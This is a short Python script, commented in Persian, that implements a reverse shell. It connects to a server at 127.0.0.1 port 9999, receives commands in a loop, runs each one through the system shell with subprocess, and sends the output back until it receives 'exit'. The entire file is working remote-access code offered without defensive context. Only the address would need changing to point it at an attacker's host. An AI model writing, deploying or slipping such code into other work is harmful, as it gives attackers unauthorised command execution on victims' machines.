import socket
import subprocess

def reverse_shell():
    server_ip = "127.0.0.1"
    server_port = 9999

    # اتصال به سرور
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server_ip, server_port))

    while True:
        # دریافت دستور از سرور
        command = s.recv(1024).decode('utf-8')

        if command.lower() == "exit":
            break
        
        # اجرای دستور
        output = subprocess.run(command, shell=True, capture_output=True)
        result = output.stdout + output.stderr

        # ارسال نتیجه به سرور
        s.send(result)
    
    s.close()

if __name__ == "__main__":
    reverse_shell()